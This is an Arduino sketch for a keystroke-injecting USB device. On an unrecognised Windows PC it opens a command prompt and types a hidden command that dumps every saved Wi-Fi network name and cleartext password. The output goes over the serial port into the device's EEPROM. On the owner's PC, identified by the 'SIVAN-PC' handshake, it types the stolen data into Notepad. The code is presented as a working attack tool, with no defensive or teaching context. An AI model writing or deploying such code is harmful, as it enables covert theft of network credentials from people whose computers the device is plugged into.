#include <Keyboard.h>
#include <EEPROM.h>
#include <avr/pgmspace.h>

const int maxLen = 1000;  // Max EEPROM bytes to store
const uint32_t TIMEOUT_MS = 10000;
const uint32_t BAUD = 115200;

const char HANDSHAKE[] PROGMEM = "SIVAN-PC";
const char magic[] PROGMEM =
  "for /f \"tokens=2 delims=()\" %P in ('wmic path Win32_PnPEntity where \"PNPDeviceID like 'USB\\\\VID_2341&PID_484C%%'\" get Name ^| find \"COM\"') do (mode %P:115200,n,8,1 & (for /f \"tokens=2,* delims=:\" %i in ('netsh wlan show profiles ^| findstr /r \".*All User Profile.*\"') do @for /f \"tokens=*\" %j in (\"%i\") do @echo %j & netsh wlan show profile name=\"%j\" key=clear | findstr \"Key Content\") > \\\\.\\%P) & exit";


bool gotHandshake() {
  size_t idx = 0;
  uint32_t start = millis();
  while (millis() - start < TIMEOUT_MS) {
    if (Serial.available()) {
      char c = Serial.read();
      char expected = pgm_read_byte(&HANDSHAKE[idx]);
      if (c == expected) {
        if (++idx == strlen_P(HANDSHAKE)) return true; // full match
      } else {
        idx = 0; // restart on mismatch
      }
    }
  }
  return false;
}

void clearEEPROM() {
  for (int i = 0; i < maxLen; i++) {
    EEPROM.update(i, '\0');  // Set each byte to 0
  }
}


void openRunBox() {
  Keyboard.press(KEY_LEFT_GUI);   // Win+R
  Keyboard.press('r');
  delay(120);
  Keyboard.releaseAll();
  delay(400);
}

void cntrlC() {
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('c');
  delay(100);
  Keyboard.releaseAll();
}

void typeSlow(const char* s) {
  while (*s) {
    Keyboard.write(*s++);
    delay(6);
  }
}

void openCMD() {
  openRunBox();
  typeSlow("cmd");
  Keyboard.write(KEY_RETURN);
  delay(700); // let CMD come to foreground
}

void runCMD() {
  for (uint16_t i = 0; ; i++) {
    char c = pgm_read_byte(&magic[i]);
    if (c == '\0') break;
    Keyboard.write(c);
  }
  Keyboard.write(KEY_RETURN);
}

void writeToArduino() {
  Serial.println("🧹 Clearing EEPROM...");
  clearEEPROM();  // Clear EEPROM before writing

  Serial.println("🕓 Waiting for Serial data...");
  static int addr = 0;
  unsigned long start = millis();

  while (millis() - start < 2000) {
    while (Serial.available()) {
      char c = Serial.read();

      // Skip spaces and tabs
      if (c == ' ' || c == '\t') continue;

      if (addr < maxLen) {
        EEPROM.update(addr++, c);
        start = millis();  // reset timeout if data is incoming
      } else {
        Serial.println("⚠️ EEPROM full.");
        return;
      }
    }
  }

  Serial.println("✅ Done receiving.");
}


void pasteEEPROMToNotepad() {
  // 1. Open Notepad
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(300);

  Keyboard.print("notepad");
  Keyboard.write(KEY_RETURN);
  delay(800);  // Wait for Notepad to open

  // 2. Type EEPROM contents
  for (int i = 0; i < maxLen; i++) {
    char c = EEPROM.read(i);
    if (c == '\0') break;  // Stop at end of string
    Keyboard.write(c);
    delay(50);  // Give Notepad time to register each key
  }
}





void readFromArduino() {
  Serial.begin(115200);
  while (!Serial);
  Serial.println("📖 Reading EEPROM contents:");
  for (int i = 0; i < maxLen; i++) {
    char c = EEPROM.read(i);
    Serial.write(c);  // Preserve tabs/newlines
  }
  Serial.println("\n--- End of EEPROM data ---");
}

void saveToEEPROM(const char* data) {
  int i = 0;
  while (data[i] != '\0' && i < maxLen - 1) {
    EEPROM.update(i, data[i]);
    i++;
  }
  EEPROM.update(i, '\0'); // Null-terminate
  for (int j = i + 1; j < maxLen; j++) {
    EEPROM.update(j, '\0');
  }
  Serial.println("✅ Saved to EEPROM.");
}

void setup() {
  Serial.begin(BAUD);
  delay(500); // allow Windows to detect COM

  Keyboard.begin();

  if (gotHandshake()) {
pasteEEPROMToNotepad();
  } else {
    openCMD();
    runCMD();
    delay(1000);  // Give the PC time to send data
    writeToArduino();
  }

  Keyboard.end();
}

void loop() {}
